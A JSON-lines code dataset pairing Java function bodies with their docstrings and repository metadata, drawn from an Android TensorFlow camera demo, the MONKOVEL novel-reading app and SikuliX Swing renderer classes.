{"docstring": "/**\n * URL\u7f16\u7801\n * <p>\u82e5\u7cfb\u7edf\u4e0d\u652f\u6301\u6307\u5b9a\u7684\u7f16\u7801\u5b57\u7b26\u96c6,\u5219\u76f4\u63a5\u5c06input\u539f\u6837\u8fd4\u56de</p>\n *\n * @param input   \u8981\u7f16\u7801\u7684\u5b57\u7b26\n * @param charset \u5b57\u7b26\u96c6\n * @return \u7f16\u7801\u4e3a\u5b57\u7b26\u96c6\u7684\u5b57\u7b26\u4e32\n */\n", "func_signal": "public static String urlEncode(String input, String charset)", "code": "{\n    try {\n        return URLEncoder.encode(input, charset);\n\n    } catch (UnsupportedEncodingException e) {\n        return input;\n\n    }\n\n}", "path": "app\\src\\main\\java\\com\\tfcamerademo\\utils\\EncodeUtils.java", "repo_name": "yuxitong/TensorFlowAndroidDemo", "stars": 696, "license": "None", "language": "java", "size": 212432}
{"docstring": "/**\n * \u5173\u95ed\u5f53\u524d\u6444\u50cf\u5934\n */\n", "func_signal": "@SuppressLint(\"NewApi\")\nprivate void closeCamera()", "code": "{\n    try {\n        cameraOpenCloseLock.acquire();\n        if (null != captureSession) {\n            captureSession.close();\n            captureSession = null;\n        }\n        if (null != cameraDevice) {\n            cameraDevice.close();\n            cameraDevice = null;\n        }\n        if (null != imageReader) {\n            imageReader.close();\n            imageReader = null;\n        }\n    } catch (InterruptedException e) {\n        throw new RuntimeException(\"Interrupted while trying to lock camera closing.\", e);\n    } finally {\n        cameraOpenCloseLock.release();\n    }\n}", "path": "app\\src\\main\\java\\com\\tfcamerademo\\Camera2BasicFragment4.java", "repo_name": "yuxitong/TensorFlowAndroidDemo", "stars": 696, "license": "None", "language": "java", "size": 212432}
{"docstring": "/**\n * \u83b7\u53d6\u4e24\u4e2a\u65f6\u95f4\u5dee\uff08\u5355\u4f4d\uff1aunit\uff09\n * <p>time1\u548ctime2\u90fd\u4e3aDate\u7c7b\u578b</p>\n *\n * @param time0 Date\u7c7b\u578b\u65f6\u95f41\n * @param time1 Date\u7c7b\u578b\u65f6\u95f42\n * @param unit  <ul>\n *              <li>{@link TimeUnit#MSEC}: \u6beb\u79d2</li>\n *              <li>{@link TimeUnit#SEC }: \u79d2</li>\n *              <li>{@link TimeUnit#MIN }: \u5206</li>\n *              <li>{@link TimeUnit#HOUR}: \u5c0f\u65f6</li>\n *              <li>{@link TimeUnit#DAY }: \u5929</li>\n *              </ul>\n * @return unit\u65f6\u95f4\u6233\n */\n", "func_signal": "public static long getIntervalTime(Date time0, Date time1, TimeUnit unit)", "code": "{\n    return Math.abs(milliseconds2Unit(date2Milliseconds(time1)\n            - date2Milliseconds(time0), unit));\n}", "path": "app\\src\\main\\java\\com\\tfcamerademo\\utils\\TimeUtils.java", "repo_name": "yuxitong/TensorFlowAndroidDemo", "stars": 696, "license": "None", "language": "java", "size": 212432}
{"docstring": "/**\n * \u5c06\u65f6\u95f4\u5b57\u7b26\u4e32\u8f6c\u4e3a\u65f6\u95f4\u6233\n * <p>\u683c\u5f0f\u4e3a\u7528\u6237\u81ea\u5b9a\u4e49</p>\n *\n * @param time   \u65f6\u95f4\u5b57\u7b26\u4e32\n * @param format \u65f6\u95f4\u683c\u5f0f\n * @return \u6beb\u79d2\u65f6\u95f4\u6233\n */\n", "func_signal": "public static long string2Milliseconds(String time, SimpleDateFormat format)", "code": "{\n    try {\n        return format.parse(time).getTime();\n    } catch (ParseException e) {\n        e.printStackTrace();\n    }\n    return -1;\n}", "path": "app\\src\\main\\java\\com\\tfcamerademo\\utils\\TimeUtils.java", "repo_name": "yuxitong/TensorFlowAndroidDemo", "stars": 696, "license": "None", "language": "java", "size": 212432}
{"docstring": "/**\n * \u83b7\u53d6\u8bbe\u5907MAC\u5730\u5740\n * <p>\u9700\u6dfb\u52a0\u6743\u9650 {@code <uses-permission android:name=\"android.permission.ACCESS_WIFI_STATE\"/>}</p>\n *\n * @param context \u4e0a\u4e0b\u6587\n * @return MAC\u5730\u5740\n */\n", "func_signal": "public static String getMacAddress(Context context)", "code": "{\n    WifiManager wifi = (WifiManager) context\n            .getSystemService(Context.WIFI_SERVICE);\n    WifiInfo info = wifi.getConnectionInfo();\n    String macAddress = info.getMacAddress().replace(\":\", \"\");\n    return macAddress == null ? \"\" : macAddress;\n}", "path": "app\\src\\main\\java\\com\\tfcamerademo\\utils\\DeviceUtils.java", "repo_name": "yuxitong/TensorFlowAndroidDemo", "stars": 696, "license": "None", "language": "java", "size": 212432}
{"docstring": "/**\n * \u83b7\u53d6\u4e24\u4e2a\u65f6\u95f4\u5dee\uff08\u5355\u4f4d\uff1aunit\uff09\n * <p>time1\u548ctime2\u683c\u5f0f\u90fd\u4e3aformat</p>\n *\n * @param time0  \u65f6\u95f4\u5b57\u7b26\u4e321\n * @param time1  \u65f6\u95f4\u5b57\u7b26\u4e322\n * @param unit   <ul>\n *               <li>{@link TimeUnit#MSEC}: \u6beb\u79d2</li>\n *               <li>{@link TimeUnit#SEC }: \u79d2</li>\n *               <li>{@link TimeUnit#MIN }: \u5206</li>\n *               <li>{@link TimeUnit#HOUR}: \u5c0f\u65f6</li>\n *               <li>{@link TimeUnit#DAY }: \u5929</li>\n *               </ul>\n * @param format \u65f6\u95f4\u683c\u5f0f\n * @return unit\u65f6\u95f4\u6233\n */\n", "func_signal": "public static long getIntervalTime(String time0, String time1, TimeUnit unit, SimpleDateFormat format)", "code": "{\n    return Math.abs(milliseconds2Unit(string2Milliseconds(time0, format)\n            - string2Milliseconds(time1, format), unit));\n}", "path": "app\\src\\main\\java\\com\\tfcamerademo\\utils\\TimeUtils.java", "repo_name": "yuxitong/TensorFlowAndroidDemo", "stars": 696, "license": "None", "language": "java", "size": 212432}
{"docstring": "//\u540c\u4e0a\n", "func_signal": "public void showLoading(String msg)", "code": "{\n    initCenter();\n    initAnimation();\n    canBack = false;\n    rootView.setBackgroundColor(Color.parseColor(\"#00000000\"));\n    rootView.setOnClickListener(null);\n    if (!isShowing()) {\n        onAttached();\n    }\n    mSharedView.showLoading(msg);\n    mSharedView.getChildAt(0).startAnimation(inAnim);\n}", "path": "app\\src\\main\\java\\com\\monke\\monkeybook\\widget\\modialog\\MoProgressHUD.java", "repo_name": "ZhangQinhao/MONKOVEL", "stars": 852, "license": "None", "language": "java", "size": 2124}
{"docstring": "/** Creates the underlying database table. */\n", "func_signal": "public static void createTable(Database db, boolean ifNotExists)", "code": "{\n    String constraint = ifNotExists? \"IF NOT EXISTS \": \"\";\n    db.execSQL(\"CREATE TABLE \" + constraint + \"\\\"BOOK_CONTENT_BEAN\\\" (\" + //\n            \"\\\"DUR_CHAPTER_URL\\\" TEXT PRIMARY KEY NOT NULL ,\" + // 0: durChapterUrl\n            \"\\\"DUR_CHAPTER_INDEX\\\" INTEGER NOT NULL ,\" + // 1: durChapterIndex\n            \"\\\"DUR_CAPTER_CONTENT\\\" TEXT,\" + // 2: durCapterContent\n            \"\\\"TAG\\\" TEXT);\"); // 3: tag\n}", "path": "app\\src\\main\\java\\com\\monke\\monkeybook\\dao\\BookContentBeanDao.java", "repo_name": "ZhangQinhao/MONKOVEL", "stars": 852, "license": "None", "language": "java", "size": 2124}
{"docstring": "//\u7528\u6765\u6bd4\u5bf9\u641c\u7d22\u7684\u4e66\u7c4d\u662f\u5426\u5df2\u7ecf\u6dfb\u52a0\u8fdb\u4e66\u67b6\n", "func_signal": "public ChoiceBookPresenterImpl(final Intent intent)", "code": "{\n     url = intent.getStringExtra(\"url\");\n     title = intent.getStringExtra(\"title\");\n     Observable.create(new ObservableOnSubscribe<List<BookShelfBean>>() {\n         @Override\n         public void subscribe(ObservableEmitter<List<BookShelfBean>> e) throws Exception {\n             List<BookShelfBean> temp = DbHelper.getInstance().getmDaoSession().getBookShelfBeanDao().queryBuilder().list();\n             if (temp == null)\n                 temp = new ArrayList<BookShelfBean>();\n             e.onNext(temp);\n         }\n     }).subscribeOn(Schedulers.io())\n             .observeOn(AndroidSchedulers.mainThread())\n             .subscribe(new SimpleObserver<List<BookShelfBean>>() {\n                 @Override\n                 public void onNext(List<BookShelfBean> value) {\n                     bookShelfs.addAll(value);\n                     initPage();\n                     toSearchBooks(null);\n                     mView.startRefreshAnim();\n                 }\n\n                 @Override\n                 public void onError(Throwable e) {\n                     e.printStackTrace();\n                 }\n             });\n }", "path": "app\\src\\main\\java\\com\\monke\\monkeybook\\presenter\\impl\\ChoiceBookPresenterImpl.java", "repo_name": "ZhangQinhao/MONKOVEL", "stars": 852, "license": "None", "language": "java", "size": 2124}
{"docstring": "/** Drops the underlying database table. */\n", "func_signal": "public static void dropTable(Database db, boolean ifExists)", "code": "{\n    String sql = \"DROP TABLE \" + (ifExists ? \"IF EXISTS \" : \"\") + \"\\\"CHAPTER_LIST_BEAN\\\"\";\n    db.execSQL(sql);\n}", "path": "app\\src\\main\\java\\com\\monke\\monkeybook\\dao\\ChapterListBeanDao.java", "repo_name": "ZhangQinhao/MONKOVEL", "stars": 852, "license": "None", "language": "java", "size": 2124}
{"docstring": "/**\n * \u4e2d\u6587\u6570\u5b57\u8f6c\u963f\u62c9\u4f2f\u6570\u5b57\n */\n", "func_signal": "private static int chineseNumber2Int(String chineseNumber)", "code": "{\n    int result = 0;\n    int temp = 1;//\u5b58\u653e\u4e00\u4e2a\u5355\u4f4d\u7684\u6570\u5b57\u5982\uff1a\u5341\u4e07\n    int count = 0;//\u5224\u65ad\u662f\u5426\u6709chArr\n    char[] cnArr = new char[]{'\u4e00','\u4e8c','\u4e09','\u56db','\u4e94','\u516d','\u4e03','\u516b','\u4e5d'};\n    char[] chArr = new char[]{'\u5341','\u767e','\u5343','\u4e07','\u4ebf'};\n    for (int i = 0; i < chineseNumber.length(); i++) {\n        boolean b = true;//\u5224\u65ad\u662f\u5426\u662fchArr\n        char c = chineseNumber.charAt(i);\n        for (int j = 0; j < cnArr.length; j++) {//\u975e\u5355\u4f4d\uff0c\u5373\u6570\u5b57\n            if (c == cnArr[j]) {\n                if(0 != count){//\u6dfb\u52a0\u4e0b\u4e00\u4e2a\u5355\u4f4d\u4e4b\u524d\uff0c\u5148\u628a\u4e0a\u4e00\u4e2a\u5355\u4f4d\u503c\u6dfb\u52a0\u5230\u7ed3\u679c\u4e2d\n                    result += temp;\n                    temp = 1;\n                    count = 0;\n                }\n                // \u4e0b\u6807+1\uff0c\u5c31\u662f\u5bf9\u5e94\u7684\u503c\n                temp = j + 1;\n                b = false;\n                break;\n            }\n        }\n        if(b){//\u5355\u4f4d{'\u5341','\u767e','\u5343','\u4e07','\u4ebf'}\n            for (int j = 0; j < chArr.length; j++) {\n                if (c == chArr[j]) {\n                    switch (j) {\n                        case 0:\n                            temp *= 10;\n                            break;\n                        case 1:\n                            temp *= 100;\n                            break;\n                        case 2:\n                            temp *= 1000;\n                            break;\n                        case 3:\n                            temp *= 10000;\n                            break;\n                        case 4:\n                            temp *= 100000000;\n                            break;\n                        default:\n                            break;\n                    }\n                    count++;\n                }\n            }\n        }\n        if (i == chineseNumber.length() - 1) {//\u904d\u5386\u5230\u6700\u540e\u4e00\u4e2a\u5b57\u7b26\n            result += temp;\n        }\n    }\n    return result;\n}", "path": "app\\src\\main\\java\\com\\monke\\monkeybook\\utils\\NumberUtil.java", "repo_name": "ZhangQinhao/MONKOVEL", "stars": 852, "license": "None", "language": "java", "size": 2124}
{"docstring": "//////////////////////////////////////////////////////////\n", "func_signal": "public Boolean onKeyDown(int keyCode, KeyEvent event)", "code": "{\n    if (keyCode == KeyEvent.KEYCODE_BACK) {\n        if (isShowing() && canBack) {\n            dismiss();\n            return true;\n        }\n    }\n    return false;\n}", "path": "app\\src\\main\\java\\com\\monke\\monkeybook\\widget\\modialog\\MoProgressHUD.java", "repo_name": "ZhangQinhao/MONKOVEL", "stars": 852, "license": "None", "language": "java", "size": 2124}
{"docstring": "/////////////////////////////////////////////////////////////////////////////////////////////////////////////\n", "func_signal": "@Override\npublic Observable<BookContentBean> getBookContent(final String durChapterUrl, final int durChapterIndex)", "code": "{\n    return getRetrofitObject(TAG).create(ILingdiankanshuApi.class).getBookContent(durChapterUrl.replace(TAG, \"\")).flatMap(new Function<String, ObservableSource<BookContentBean>>() {\n        @Override\n        public ObservableSource<BookContentBean> apply(String s) throws Exception {\n            return analyBookContent(s, durChapterUrl, durChapterIndex);\n        }\n    });\n}", "path": "app\\src\\main\\java\\com\\monke\\monkeybook\\model\\impl\\LingdiankanshuStationBookModelImpl.java", "repo_name": "ZhangQinhao/MONKOVEL", "stars": 852, "license": "None", "language": "java", "size": 2124}
{"docstring": "/**\n * \u5176\u4ed6\u7ad9\u70b9\u96c6\u5408\u641c\u7d22\n */\n", "func_signal": "@Override\npublic Observable<List<SearchBookBean>> searchOtherBook(String content,int page,String tag)", "code": "{\n    if(tag.equals(GxwztvBookModelImpl.TAG)){\n        return GxwztvBookModelImpl.getInstance().searchBook(content, page);\n    }\n    else if(tag.equals(LingdiankanshuStationBookModelImpl.TAG)){\n        return LingdiankanshuStationBookModelImpl.getInstance().searchBook(content, page);\n    }\n    else{\n        return Observable.create(new ObservableOnSubscribe<List<SearchBookBean>>() {\n            @Override\n            public void subscribe(ObservableEmitter<List<SearchBookBean>> e) throws Exception {\n                e.onNext(new ArrayList<SearchBookBean>());\n                e.onComplete();\n            }\n        });\n    }\n}", "path": "app\\src\\main\\java\\com\\monke\\monkeybook\\model\\impl\\WebBookModelImpl.java", "repo_name": "ZhangQinhao/MONKOVEL", "stars": 852, "license": "None", "language": "java", "size": 2124}
{"docstring": "/**\n * \u7ae0\u8282\u7f13\u5b58\n */\n", "func_signal": "@Override\npublic Observable<BookContentBean> getBookContent(String durChapterUrl, int durChapterIndex, String tag)", "code": "{\n    if(tag.equals(GxwztvBookModelImpl.TAG)){\n        return GxwztvBookModelImpl.getInstance().getBookContent(durChapterUrl, durChapterIndex);\n    }\n    else if(tag.equals(LingdiankanshuStationBookModelImpl.TAG)){\n        return LingdiankanshuStationBookModelImpl.getInstance().getBookContent(durChapterUrl, durChapterIndex);\n    }\n    else\n        return Observable.create(new ObservableOnSubscribe<BookContentBean>() {\n            @Override\n            public void subscribe(ObservableEmitter<BookContentBean> e) throws Exception {\n                e.onNext(new BookContentBean());\n                e.onComplete();\n            }\n        });\n}", "path": "app\\src\\main\\java\\com\\monke\\monkeybook\\model\\impl\\WebBookModelImpl.java", "repo_name": "ZhangQinhao/MONKOVEL", "stars": 852, "license": "None", "language": "java", "size": 2124}
{"docstring": "/////////////////////////////////////////////////////////////////////////////////////////////////////////////\n", "func_signal": "@Override\npublic Observable<BookShelfBean> getBookInfo(final BookShelfBean bookShelfBean)", "code": "{\n    return getRetrofitObject(TAG).create(ILingdiankanshuApi.class).getBookInfo(bookShelfBean.getNoteUrl().replace(TAG, \"\")).flatMap(new Function<String, ObservableSource<BookShelfBean>>() {\n        @Override\n        public ObservableSource<BookShelfBean> apply(String s) throws Exception {\n            return analyBookInfo(s, bookShelfBean);\n        }\n    });\n}", "path": "app\\src\\main\\java\\com\\monke\\monkeybook\\model\\impl\\LingdiankanshuStationBookModelImpl.java", "repo_name": "ZhangQinhao/MONKOVEL", "stars": 852, "license": "None", "language": "java", "size": 2124}
{"docstring": "/**\n * \u7f51\u7edc\u89e3\u6790\u56fe\u4e66\u76ee\u5f55\n * return BookShelfBean\n */\n", "func_signal": "@Override\npublic void getChapterList(final BookShelfBean bookShelfBean, OnGetChapterListListener getChapterListListener)", "code": "{\n    if(bookShelfBean.getTag().equals(GxwztvBookModelImpl.TAG)){\n        GxwztvBookModelImpl.getInstance().getChapterList(bookShelfBean, getChapterListListener);\n    }\n    else if(bookShelfBean.getTag().equals(LingdiankanshuStationBookModelImpl.TAG)){\n        LingdiankanshuStationBookModelImpl.getInstance().getChapterList(bookShelfBean, getChapterListListener);\n    }\n    else{\n        if(getChapterListListener!=null)\n            getChapterListListener.success(bookShelfBean);\n    }\n}", "path": "app\\src\\main\\java\\com\\monke\\monkeybook\\model\\impl\\WebBookModelImpl.java", "repo_name": "ZhangQinhao/MONKOVEL", "stars": 852, "license": "None", "language": "java", "size": 2124}
{"docstring": "/** Creates the underlying database table. */\n", "func_signal": "public static void createTable(Database db, boolean ifNotExists)", "code": "{\n    String constraint = ifNotExists? \"IF NOT EXISTS \": \"\";\n    db.execSQL(\"CREATE TABLE \" + constraint + \"\\\"CHAPTER_LIST_BEAN\\\" (\" + //\n            \"\\\"NOTE_URL\\\" TEXT,\" + // 0: noteUrl\n            \"\\\"DUR_CHAPTER_INDEX\\\" INTEGER NOT NULL ,\" + // 1: durChapterIndex\n            \"\\\"DUR_CHAPTER_URL\\\" TEXT PRIMARY KEY NOT NULL ,\" + // 2: durChapterUrl\n            \"\\\"DUR_CHAPTER_NAME\\\" TEXT,\" + // 3: durChapterName\n            \"\\\"TAG\\\" TEXT,\" + // 4: tag\n            \"\\\"HAS_CACHE\\\" INTEGER);\"); // 5: hasCache\n}", "path": "app\\src\\main\\java\\com\\monke\\monkeybook\\dao\\ChapterListBeanDao.java", "repo_name": "ZhangQinhao/MONKOVEL", "stars": 852, "license": "None", "language": "java", "size": 2124}
{"docstring": "/////////////////////////////////////////////////////////////////////////////////////////////////////////////\n", "func_signal": "@Override\npublic void getChapterList(final BookShelfBean bookShelfBean, final OnGetChapterListListener getChapterListListener)", "code": "{\n    getRetrofitObject(TAG).create(ILingdiankanshuApi.class).getChapterList(bookShelfBean.getBookInfoBean().getChapterUrl().replace(TAG, \"\")).flatMap(new Function<String, ObservableSource<WebChapterBean<BookShelfBean>>>() {\n        @Override\n        public ObservableSource<WebChapterBean<BookShelfBean>> apply(String s) throws Exception {\n            return analyChapterList(s, bookShelfBean);\n        }\n    })\n            .subscribeOn(Schedulers.io())\n            .observeOn(AndroidSchedulers.mainThread())\n            .subscribe(new SimpleObserver<WebChapterBean<BookShelfBean>>() {\n                @Override\n                public void onNext(WebChapterBean<BookShelfBean> value) {\n                    if (getChapterListListener != null) {\n                        getChapterListListener.success(value.getData());\n                    }\n                }\n\n                @Override\n                public void onError(Throwable e) {\n                    e.printStackTrace();\n                    if (getChapterListListener != null) {\n                        getChapterListListener.error();\n                    }\n                }\n            });\n}", "path": "app\\src\\main\\java\\com\\monke\\monkeybook\\model\\impl\\LingdiankanshuStationBookModelImpl.java", "repo_name": "ZhangQinhao/MONKOVEL", "stars": 852, "license": "None", "language": "java", "size": 2124}
{"docstring": "//////////////////////\u4e24\u4e2a\u4e0d\u540c\u7b49\u7ea7\u7684\u6309\u94ae//////////////////////\n", "func_signal": "public void showTwoButton(String msg, String b_f, View.OnClickListener c_f, String b_s, View.OnClickListener c_s)", "code": "{\n    initCenter();\n    initAnimation();\n    canBack = true;\n    rootView.setBackgroundColor(Color.parseColor(\"#CC000000\"));\n    rootView.setOnClickListener(null);\n    mSharedView.showTwoButton(msg, b_f, c_f, b_s, c_s);\n    if (!isShowing()) {\n        onAttached();\n    }\n    mSharedView.getChildAt(0).startAnimation(inAnim);\n}", "path": "app\\src\\main\\java\\com\\monke\\monkeybook\\widget\\modialog\\MoProgressHUD.java", "repo_name": "ZhangQinhao/MONKOVEL", "stars": 852, "license": "None", "language": "java", "size": 2124}
{"docstring": "//\u5355\u4e2a\u6309\u94ae\u7684\u63d0\u793a\u4fe1\u606f\n", "func_signal": "public void showInfo(String msg)", "code": "{\n    initCenter();\n    initAnimation();\n    canBack = true;\n    rootView.setBackgroundColor(Color.parseColor(\"#00000000\"));\n    rootView.setOnClickListener(null);\n    mSharedView.showInfo(msg, new View.OnClickListener() {\n        @Override\n        public void onClick(View v) {\n            dismiss();\n        }\n    });\n    if (!isShowing()) {\n        onAttached();\n    }\n    mSharedView.getChildAt(0).startAnimation(inAnim);\n}", "path": "app\\src\\main\\java\\com\\monke\\monkeybook\\widget\\modialog\\MoProgressHUD.java", "repo_name": "ZhangQinhao/MONKOVEL", "stars": 852, "license": "None", "language": "java", "size": 2124}
{"docstring": "/**\n * \u7f51\u7edc\u8bf7\u6c42\u5e76\u89e3\u6790\u4e66\u7c4d\u4fe1\u606f\n * return BookShelfBean\n */\n", "func_signal": "@Override\npublic Observable<BookShelfBean> getBookInfo(BookShelfBean bookShelfBean)", "code": "{\n    if(bookShelfBean.getTag().equals(GxwztvBookModelImpl.TAG)){\n        return GxwztvBookModelImpl.getInstance().getBookInfo(bookShelfBean);\n    }\n    else if(bookShelfBean.getTag().equals(LingdiankanshuStationBookModelImpl.TAG)){\n        return LingdiankanshuStationBookModelImpl.getInstance().getBookInfo(bookShelfBean);\n    }\n    else {\n        return null;\n    }\n}", "path": "app\\src\\main\\java\\com\\monke\\monkeybook\\model\\impl\\WebBookModelImpl.java", "repo_name": "ZhangQinhao/MONKOVEL", "stars": 852, "license": "None", "language": "java", "size": 2124}
{"docstring": "//\u5355\u4e2a\u6309\u94ae\u7684\u63d0\u793a\u4fe1\u606f\n", "func_signal": "public void showInfo(String msg, String btnText, View.OnClickListener listener)", "code": "{\n    initCenter();\n    initAnimation();\n    canBack = true;\n    rootView.setBackgroundColor(Color.parseColor(\"#CC000000\"));\n    rootView.setOnClickListener(null);\n    mSharedView.showInfo(msg, btnText, listener);\n    if (!isShowing()) {\n        onAttached();\n    }\n    mSharedView.getChildAt(0).startAnimation(inAnim);\n}", "path": "app\\src\\main\\java\\com\\monke\\monkeybook\\widget\\modialog\\MoProgressHUD.java", "repo_name": "ZhangQinhao/MONKOVEL", "stars": 852, "license": "None", "language": "java", "size": 2124}
{"docstring": "/**\n * Change the checked state of the view\n *\n * @param checked The new checked state\n */\n", "func_signal": "@Override\npublic void setChecked(boolean checked)", "code": "{\n    if (this.isChecked != checked)\n    {\n        this.isChecked = checked;\n        refreshDrawableState();\n    }\n}", "path": "app\\src\\main\\java\\com\\monke\\monkeybook\\widget\\flowlayout\\TagView.java", "repo_name": "ZhangQinhao/MONKOVEL", "stars": 852, "license": "None", "language": "java", "size": 2124}
{"docstring": "////////////////////////////////////////////////////////////////////////////////////////////////\n", "func_signal": "@Override\npublic void addBookToShelf(final SearchBookBean searchBookBean)", "code": "{\n    final BookShelfBean bookShelfResult = new BookShelfBean();\n    bookShelfResult.setNoteUrl(searchBookBean.getNoteUrl());\n    bookShelfResult.setFinalDate(0);\n    bookShelfResult.setDurChapter(0);\n    bookShelfResult.setDurChapterPage(0);\n    bookShelfResult.setTag(searchBookBean.getTag());\n    WebBookModelImpl.getInstance().getBookInfo(bookShelfResult)\n            .subscribeOn(Schedulers.io())\n            .observeOn(AndroidSchedulers.mainThread())\n            .compose(((BaseActivity)mView.getContext()).<BookShelfBean>bindUntilEvent(ActivityEvent.DESTROY))\n            .subscribe(new SimpleObserver<BookShelfBean>() {\n                @Override\n                public void onNext(BookShelfBean value) {\n                    WebBookModelImpl.getInstance().getChapterList(value, new OnGetChapterListListener() {\n                        @Override\n                        public void success(BookShelfBean bookShelfBean) {\n                            saveBookToShelf(bookShelfBean);\n                        }\n\n                        @Override\n                        public void error() {\n                            mView.addBookShelfFailed(NetworkUtil.ERROR_CODE_OUTTIME);\n                        }\n                    });\n                }\n\n                @Override\n                public void onError(Throwable e) {\n                    mView.addBookShelfFailed(NetworkUtil.ERROR_CODE_OUTTIME);\n                }\n            });\n}", "path": "app\\src\\main\\java\\com\\monke\\monkeybook\\presenter\\impl\\ChoiceBookPresenterImpl.java", "repo_name": "ZhangQinhao/MONKOVEL", "stars": 852, "license": "None", "language": "java", "size": 2124}
{"docstring": "////////////////////////////////////////////////////////////////////////////////////////////////////\n", "func_signal": "@Override\npublic void attachView(@NonNull IView iView)", "code": "{\n    super.attachView(iView);\n    RxBus.get().register(this);\n}", "path": "app\\src\\main\\java\\com\\monke\\monkeybook\\presenter\\impl\\ChoiceBookPresenterImpl.java", "repo_name": "ZhangQinhao/MONKOVEL", "stars": 852, "license": "None", "language": "java", "size": 2124}
{"docstring": "/**\n * {@inheritDoc}<p>\n *\n * Here: set's the buttons horizontal alignment and borderpainted properties\n * to this provider's properties.\n */\n", "func_signal": "@Override\nprotected void configureState(CellContext context)", "code": "{\n    rendererComponent.setBorderPainted(isBorderPainted());\n    rendererComponent.setHorizontalAlignment(getHorizontalAlignment());\n}", "path": "IDE\\src\\main\\java\\org\\jdesktop\\swingx\\renderer\\CheckBoxProvider.java", "repo_name": "RaiMan/SikuliX-2014", "stars": 806, "license": "None", "language": "java", "size": 169878}
{"docstring": "/**\n *\n * @param g\n */\n", "func_signal": "protected void paintComponentWithPainter(Graphics2D g)", "code": "{\n    // 1. be sure to fill the background\n    // 2. paint the painter\n    // by-pass ui.update and hook into ui.paint directly\n    if (ui != null) {\n        // fail fast: we assume that g must not be null\n        // which throws an NPE here instead deeper down the bowels\n        // this differs from corresponding core implementation!\n        Graphics scratchGraphics = g.create();\n        try {\n            scratchGraphics.setColor(getBackground());\n            scratchGraphics.fillRect(0, 0, getWidth(), getHeight());\n            paintPainter(g);\n            ui.paint(scratchGraphics, this);\n//                super.paintComponent(g);\n        } finally {\n            scratchGraphics.dispose();\n        }\n    }\n\n}", "path": "IDE\\src\\main\\java\\org\\jdesktop\\swingx\\renderer\\JRendererCheckBox.java", "repo_name": "RaiMan/SikuliX-2014", "stars": 806, "license": "None", "language": "java", "size": 169878}
{"docstring": "/**\n * Applies a suitable background for the renderer component within the\n * specified adapter. <p>\n *\n * This implementation applies its a darkened background to an unselected\n * adapter. Does nothing for selected cells.\n *\n * @param renderer the cell renderer component that is to be decorated\n * @param adapter the ComponentAdapter for this decorate operation\n */\n", "func_signal": "@Override\nprotected void applyBackground(Component renderer, ComponentAdapter adapter)", "code": "{\n    if (adapter.isSelected())\n        return;\n    // PENDING JW: really? That would be applying a absolute color, instead\n    // of shading whatever the renderer has.\n    Color background = getBackground();\n    if (background == null) {\n        background = renderer.getBackground();\n    }\n    // Change to the following\n//        Color background = renderer.getBackground();\n    if (background != null) {\n        renderer.setBackground(computeBackgroundSeed(background));\n    }\n}", "path": "IDE\\src\\main\\java\\org\\jdesktop\\swingx\\decorator\\ShadingColorHighlighter.java", "repo_name": "RaiMan/SikuliX-2014", "stars": 806, "license": "None", "language": "java", "size": 169878}
{"docstring": "//\n// Formatter\n//\n", "func_signal": "@Override\npublic void format( Iterable<Token> tokenSource, Writer writer ) throws IOException", "code": "{\n\twriter.write( getDocHeader1() );\n\twriter.write( \"  <title>\" );\n\twriter.write( Util.escapeHtml( getTitle() ) );\n\twriter.write( \"</title>\\n\" );\n\twriter.write( getDocHeader2() );\n\twriter.write( getEncoding() );\n\twriter.write( getDocHeader3() );\n\twriter.write( getCssFileTemplate() );\n\tformatStyleSheet( writer );\n\twriter.write( getDocHeader4() );\n\tif( getTitle().length() > 0 )\n\t{\n\t\twriter.write( \"<h2>\" );\n\t\twriter.write( Util.escapeHtml( getTitle() ) );\n\t\twriter.write( \"</h2>\\n\" );\n\t}\n\twriter.write( \"<div><pre>\\n\" );\n\tStringBuilder line = new StringBuilder();\n\tint line_no = 1;\n\tfor( Token token : tokenSource )\n\t{\n        String[] toks = token.getValue().split(\"\\n\", -1);\n        for(int i = 0; i < toks.length - 1; i++) {\n            format_partial_token(token, toks[i], line);\n            format_line(line.toString(), writer, line_no++);\n            line = new StringBuilder();\n            }\n            format_partial_token(token, toks[toks.length-1], line);\n\t}\n\tif(line.length() > 0)\n\t    format_line(line.toString(), writer, line_no++);\n\n\twriter.write( \"</pre></div>\\n\" );\n\twriter.write( getDocFooter() );\n\twriter.flush();\n}", "path": "IDE\\src\\main\\java\\org\\sikuli\\syntaxhighlight\\contrib\\HtmlFormatter.java", "repo_name": "RaiMan/SikuliX-2014", "stars": 806, "license": "None", "language": "java", "size": 169878}
{"docstring": "/**\n * Instantiates a JRendererCheckBox with opacity true.\n */\n", "func_signal": "public JRendererCheckBox()", "code": "{\n    super();\n    // fix # 1546-swingx: striping lost in synth-based lafs\n    // forcing opaque to enable painting the background\n    setOpaque(true);\n}", "path": "IDE\\src\\main\\java\\org\\jdesktop\\swingx\\renderer\\JRendererCheckBox.java", "repo_name": "RaiMan/SikuliX-2014", "stars": 806, "license": "None", "language": "java", "size": 169878}
{"docstring": "/**\n * Overridden to snatch painting from super if a painter installed or Nimbus\n * detected.<p>\n *\n * The overall logic currently (since 1.6.5) is to simply call super without SwingX\n * painter. Otherwise, that is with SwingX painter:\n * <ol>\n * <li> if opaque\n * <ol>\n * <li> set a flag which fakes transparency, that is both\n *      <code>contentAreaFilled</code> and\n *      <code>opaque</code> return false\n * <li> fill background with the component's background color\n * <li> apply swingx painter\n * <li> hook into <code>ui.paint(...)</code>\n * <li> reset the flag\n * </ol>\n * <li> else\n * <ol> apply swingx painter\n * <ol> call super\n * <li>\n * <ol>\n * </ol>\n *\n * Note that Nimbus is special cased (mainly due to its bug of\n * even row striping instead of odd)\n * and handled as if a SwingX painter were set.\n *\n */\n", "func_signal": "@Override\nprotected void paintComponent(Graphics g)", "code": "{\n    // JW: hack around for #1178-swingx (core issue)\n    // grab painting if Nimbus detected\n    if ((painter != null) || isNimbus()) {\n        // we have a custom (background) painter\n        // try to inject if possible\n        // there's no guarantee - some LFs have their own background\n        // handling  elsewhere\n        if (isOpaque()) {\n            // replace the paintComponent completely\n            fakeTransparency = true;\n            paintComponentWithPainter((Graphics2D) g);\n            fakeTransparency = false;\n        } else {\n            // transparent apply the background painter before calling super\n            paintPainter(g);\n            super.paintComponent(g);\n        }\n    } else {\n        // nothing to worry about - delegate to super\n        super.paintComponent(g);\n    }\n}", "path": "IDE\\src\\main\\java\\org\\jdesktop\\swingx\\renderer\\JRendererCheckBox.java", "repo_name": "RaiMan/SikuliX-2014", "stars": 806, "license": "None", "language": "java", "size": 169878}
